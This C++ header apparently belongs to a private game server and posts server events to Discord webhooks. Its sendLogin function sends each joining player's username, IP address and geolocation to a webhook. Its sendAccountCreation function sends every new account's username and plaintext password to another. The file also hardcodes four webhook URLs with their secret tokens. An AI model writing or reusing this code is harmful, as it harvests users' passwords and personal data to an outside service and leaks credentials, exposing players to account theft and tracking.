#pragma once
#include <ctime>
#include <iostream>
#include <dpp/dpp.h>
#include "Discordthing.h"

std::string getCurrentTime() {
    time_t now = time(nullptr);
    char buffer[100];
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localtime(&now));
    return std::string(buffer);
}

namespace DiscordBot {
    void init() {
        string time = getCurrentTime();
        std::cout << "Discord Bot Initialized at " << time << std::endl;
        dpp::cluster bot("");
        bot.on_log(dpp::utility::cout_logger());
        dpp::webhook wh("https://discord.com/api/webhooks/1352710067622903912/mPVK7gHEPr6GEByqdHN4GmsKKDABKEBxSOWq63c98MCCbPne0LofFFhcByys4DVf1Fk3");
        bot.execute_webhook(wh, dpp::message("Executed at " + time));
    }
    void sendLogin(const std::string& username, const std::string& ipAddress) {
        std::string locationInfo = NetworkUtils::getClientLocation(ipAddress);
        std::string currentTime = getCurrentTime();
        std::string kontol = "📥 **User Joined!** 📥\n"
                   "IP: `" + ipAddress + "`\n"
                   "👤 **Username:** `" + username + "`\n"
                   "🌍 **Location:** `" + locationInfo + "`\n"
                   "🕒 **Time:** `" + currentTime + "`";

        dpp::cluster bot("");
        bot.on_log(dpp::utility::cout_logger());
        dpp::webhook wh("https://discord.com/api/webhooks/1352709223838122044/GKyS5MnYmJopJhWqEPHmEGmroAz5ohozAhKvdFXdkO1Xty29JVeYEfIURhCMVkCkHpeX");
        bot.execute_webhook(wh, dpp::message(kontol));
    }
    void sendAccountCreation(const std::string& username, const std::string& password) {
        std::string currentTime = getCurrentTime();
        std::string pepek = "GrowID Creation Logs\n"
                   "👤 **Username:** `" + username + "`\n"
                   "🔑 **Password:** `" + password + "`\n"
                   "🕒 **Time:** `" + currentTime + "`";

        dpp::cluster bot("");
        bot.on_log(dpp::utility::cout_logger());
        dpp::webhook wh("https://discord.com/api/webhooks/1352695538427891792/H20zgbEK9rWroxX9of9jSxz9ToEQNhIp8Kl8g9ekIBLAYRfFHk2YKq12HWb5ukE_gc-Z");
        bot.execute_webhook(wh, dpp::message(pepek));
    }
    void sendSusPacket(const std::string& packet) {
        std::string packetlogs = "🔒 **Suspicious Packet Detected!** 🔒\n"
                   "📦 **Packet total:** `" + packet + "`";
        dpp::cluster bot("");
        bot.on_log(dpp::utility::cout_logger());
        dpp::webhook wh("https://discord.com/api/webhooks/1352708977443737640/S79gzLeiIEyQC6oxzCZCA43DqAZ442e5xgGyrhHL6-rb4bSmU2ZJQSyM8imVXAkvmlao");
        bot.execute_webhook(wh, dpp::message(packetlogs));
    }
}